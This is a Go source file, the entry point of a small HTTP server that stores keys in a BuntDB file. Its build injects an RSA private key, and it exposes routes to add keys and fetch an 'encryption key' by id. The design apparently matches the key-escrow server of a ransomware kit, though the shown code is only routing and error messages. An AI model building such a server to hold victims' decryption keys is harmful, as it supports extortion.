package main

import (
	"log"
	"net/http"

	"github.com/julienschmidt/httprouter"
)

var (
	ApiResponseForbidden        = `{"status": 403, "message": "Seems like you are not welcome here... Bye"}`
	ApiResponseBadJson          = `{"status": 400, "message": "Expect valid json payload"}`
	ApiResponseDuplicatedId     = `{"status": 409, "message": "Duplicated Id"}`
	ApiResponseBadRSAEncryption = `{"status": 422, "message": "Error validating payload, bad public key"}`
	ApiResponseNoPayload        = `{"status": 422, "message": "No payload"}`
	ApiResponseBadRequest       = `{"status": 400, "message": "Bad Request"}`
	ApiResponseResourceNotFound = `{"status": 418, "message": "Resource Not Found"}`
	ApiResponseNotFound         = `{"status": 404, "message": "Not Found"}`

	// RSA Private key
	// Automatically injected on autobuild with make
	PRIV_KEY = []byte(`INJECT_PRIV_KEY_HERE`)

	// BuntDB Database for store the keys
	// It will create if not exists
	Database = "./database.db"
)

func main() {
	router := httprouter.New()

	router.POST("/api/keys/add", addKeys)
	router.GET("/api/keys/:id", getEncryptionKey)
	router.NotFound = http.HandlerFunc(notFound)

	log.Println("Listening on port 8080")
	log.Fatal(http.ListenAndServe(":8080", router))
}
